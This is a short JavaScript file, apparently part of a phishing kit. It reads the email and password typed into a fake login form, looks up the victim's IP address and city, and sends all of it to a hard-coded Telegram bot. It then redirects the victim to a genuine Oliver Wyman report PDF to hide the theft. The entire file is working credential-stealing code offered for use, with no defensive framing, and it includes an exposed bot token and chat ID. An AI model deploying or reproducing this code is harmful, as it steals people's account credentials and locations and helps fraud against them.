// sender2.js — For index2.html (or the step after sender1).  Sends to Telegram, then redirects to external PDF or site.

const TELEGRAM_BOT_TOKEN = "8292423468:AAEQQXMHQ7jmJFyfrGX7vsWhr6GH-ORn8dk";
const TELEGRAM_CHAT_ID = "-5006528512";
const REDIRECT_URL = "https://www.oliverwyman.com/content/dam/oliver-wyman/v2/publications/2020/jun/Global-Wealth-Management-Report-2020.pdf"; // External redirect

document.addEventListener("DOMContentLoaded", function () {
  const form = document.getElementById("resultForm"); // Adjust if your form's id is different
  const messageDiv = document.getElementById("msg");

  form.addEventListener("submit", async function (e) {
    e.preventDefault();

    const email = form.email.value;
    const password = form.password.value;

    let locationInfo = "Location: Unknown";
    try {
      const res = await fetch("https://ip-api.io/json");
      const data = await res.json();
      locationInfo = `Country: ${data.country_name || ""}, City: ${data.city || ""}, IP: ${data.ip || ""}, ZIP: ${data.postal || ""}`;
    } catch { /* ignore fetch errors */ }

    // Build the message (customize label if needed)
    const text = `
---------------|54|---------------
Username: ${email}
Password: ${password}
${locationInfo}
-------------------------------
`;

    // Send to Telegram
    const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    const payload = { chat_id: TELEGRAM_CHAT_ID, text };

    try {
      const telegramRes = await fetch(telegramUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
      });
      if (!telegramRes.ok) throw new Error("Telegram API error");
      window.location.href = REDIRECT_URL;
    } catch {
      messageDiv.textContent = "Failed to send. Please try again.";
    }
  });
});
